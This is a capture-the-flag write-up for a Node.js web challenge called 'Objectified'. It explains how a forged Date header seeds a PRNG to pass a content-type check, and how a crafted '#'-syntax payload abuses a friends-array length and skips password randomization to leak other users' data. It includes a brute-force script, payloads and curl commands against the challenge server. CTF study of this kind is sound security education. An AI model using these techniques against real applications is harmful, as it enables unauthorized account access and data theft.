---
title: Objectified
category: Web Exploitation
tags: 
draft: false
completedDuringEvent: true
submitted: true
points: 499
solves: 2
flag: Meta4Sec{Objectified.__proto__=[];for(let i=0;i<Objectified;i++){console.log(1);}console.log('__proto__canoverwritetypes,attributes,functions,andevenitcanoverwriteitself.');}
---

> What is rate limiting, and why do people rely on libraries just to implement it? You don’t need fancy middleware when you have `Objectified`, a custom data structure similar to JSON, but using `#` as its field identifier.

by `replicant`

---

We are given an application that uses `Objectified`, a custom data structure similar to JSON but with `#` as the field identifier. The application has register and login functionalities.

## Bypassing `req.objectified`

The application requires `req.objectified` to be set during registration and login:

```js
if (!req.objectified) {
  return res.status(400).send("Invalid objectified 2");
}
```

`req.objectified` is created in the middleware:

```js
app.use((req, res, next) => {
  const contentType = req.headers["content-type"] || "";
  const allContentType = [];
  for (let i = 97; i <= 10000; i++) {
    allContentType.push(String.fromCharCode(i));
  }
  function m32(k) {
    return function () {
      let t = (k += 0x6d2b79f5);
      t = Math.imul(t ^ (t >>> 15), t | 1);
      t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }
  function choice(arr, r) {
    return arr[Math.floor(r() * arr.length)];
  }
  let rand = Date.now();
  if (req.headers.date) {
    rand = new Date(req.headers.date).getTime();
    if (isNaN(rand)) {
      return res.status(400).send("Invalid date format");
    }
  }
  const randomLetter = choice(allContentType, m32(rand));
  if (contentType.startsWith(randomLetter)) {
    upload.none()(req, res, (err) => {
      if (err) {
        console.error(err);
        return res.status(400).send("Invalid objectified");
      }
      req.headers["content-type"] = "application/objectified";
      for (const key in req.body) {
        if (typeof req.body[key] === "string") {
          if (req.body[key].length < 5) {
            return res.status(400).send("Too small");
          }
        }
      }
      req.objectified = req.body;
      next();
    });
  } else {
    next();
  }
});
```

The `content-type` header must start with `randomLetter` for `req.objectified` to be set. Since we can control `req.headers.date`, we can brute-force the `randomLetter` to start with `m`:

```js
const allContentType = [];
for (let i = 97; i <= 10000; i++) {
  allContentType.push(String.fromCharCode(i));
}
function m32(k) {
  return function () {
    let t = (k += 0x6d2b79f5);
    t = Math.imul(t ^ (t >>> 15), t | 1);
    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
  };
}
function choice(arr, r) {
  return arr[Math.floor(r() * arr.length)];
}

for (let i = 0; i < 999_999; i++) {
  const randomLetter = choice(allContentType, m32(i));
  if (randomLetter.startsWith("m")) {
    console.log(`Found random letter: ${randomLetter} (${new Date(rand).toISOString()})`);
    break;
  }
}
```

## Vulnerability Analysis

The provided code snippet shows how the application creates user data:

```js
function createUsersObject(user) {
  if (typeof user.username !== "string") {
    return;
  }
  if (typeof user.password !== "string") {
    return;
  }
  if (typeof user.data !== "string") {
    return;
  }
  const userObj = JSON.parse(`{
    "username": ${JSON.stringify(user.username)},
    "password": ${JSON.stringify(user.password)}
  }`);
  Objectify.get("users").push(userObj);
  const initCustomObject = customObjectFields(user.data);
  allUsers = Objectify.get("users");
  for (const user of allUsers) {
    if (user.username === userObj.username) {
      userObj["data"] = initCustomObject;
      userObj["data"]["password"] = userObj.password;
    }
  }
  Objectify.push("users", userObj);
  Objectify.removeDuplicateUsers();
  allUsersAgain = Objectify.get("users");

  const usersArr = [];
  for (const user of allUsersAgain) {
    if (user["data"]["custom"]) {
      if (user["data"]["author"]["name"]) {
        user["data"]["custom"]["writtenBy"] = user["data"]["author"]["name"];
      }
      if (user["data"]["friends"]) {
        const friends = user["data"]["friends"];
        for (i = 0; i < friends.length; i++) {
          if (!friends[i]) {
            friends[i] = usersArr[i];
          }
        }
      }
      if (user["data"]["hiddenMessage"]) {
        const hiddenMsg = user["data"]["hiddenMessage"];
        user["data"]["hiddenMessage"] = encMsg(hiddenMsg);
      }
    }

    user["data"][user.username] = crypto.randomBytes(16).toString("hex");
    user["data"]["password"] = crypto.randomBytes(16).toString("hex");

    if (user["data"]["delete"]) {
      delete user["data"][user["data"]["delete"]];
    }

    usersArr.push(user);
  }
  return userObj;
}
```

More specifically, the vulnerability lies in:

```js
if (user["data"]["friends"]) {
  const friends = user["data"]["friends"];
  for (i = 0; i < friends.length; i++) {
    if (!friends[i]) {
      friends[i] = usersArr[i];
    }
  }
}
```

If `friends.length` is set to 3 and the `friends` array is empty, the `if (!friends[i])` condition will populate `friends[i]` with `usersArr[i]`. This behavior can be exploited by crafting a malicious payload.

Additionally, the application uses `crypto.randomBytes` to randomize the password:

```js
user["data"]["password"] = crypto.randomBytes(16).toString("hex");
```

To bypass this, we can introduce a structure that causes the code to crash or skip execution, such as:

```json
"data": {
    "hiddenMessage": {
        "1": ""
    }
}
```

This prevents the randomization of the password.

## Exploit Construction

The payload leverages the `Objectified` structure to manipulate the `friends` array and bypass the password randomization. The final crafted payload looks like this:

```json
"data": {
    "custom": "",
    "author": {
        "name": ""
    },
    "friends": {
      "length": 3,
    },
    "hiddenMessage": {
        "1": ""
    }
}
```

Since the application uses `#` as the field identifier, the payload is converted to:

```
#custom
#author #name ##hack
#friends #length ##3
#hiddenMessage #1 ##b
```

## Exploit Execution

1. **Register a User**:
   ```bash
   curl -X POST http://157.230.243.4:1337/api/register \
     -H "Date: 1970-01-01T00:16:36.171Z" \
     -H "Content-Type: multipart/form-data" \
     -F "username=hacker" \
     -F "password=hacked" \
     -F $'data=#custom\n#author #name ##hack\n#friends #0 ##\n#friends #1 ##\n#friends #2 ##\n#friends #length ##3\n#password #value ##hacked\n#hiddenMessage #1 ##b'
   ```

2. **Login with the Registered User**:
   ```bash
   curl -X POST http://157.230.243.4:1337/api/login \
     -H "Date: 1970-01-01T00:16:36.171Z" \
     -H "Content-Type: multipart/form-data" \
     -F "username=hacker" \
     -F "password=hacked"
   ```

## Decrypting the Flag

The flag is hidden in the `hiddenMessage` field, which is processed using the following JavaScript functions:

```js
function hiddenMessage(str, parts) {
  const chunks = splitHiddenMessage(str, parts);
  return chunks.map(encMsg);
}

function splitHiddenMessage(str, parts = 3, padChar = "_") {
  let len = str.length;
  const remainder = len % parts;

  if (remainder !== 0) {
    const padLength = parts - remainder;
    str = str + padChar.repeat(padLength);
    len = str.length;
  }

  const chunkSize = len / parts;
  const result = [];

  for (let i = 0; i < parts; i++) {
    result.push(str.slice(i * chunkSize, (i + 1) * chunkSize));
  }

  return result;
}

function encMsg(str) {
  return str.replace(/[a-zA-Z]/g, (c) =>
    String.fromCharCode(
      (c <= "Z" ? 90 : 122) >= (c = c.charCodeAt(0) + 13) ? c : c - 26
    )
  );
}
```

1. **Combine the Message**: The `splitHiddenMessage` function divides the string into 3 chunks, padding it if necessary.
2. **Apply ROT13**: The `encMsg` function applies `ROT13` to each chunk.
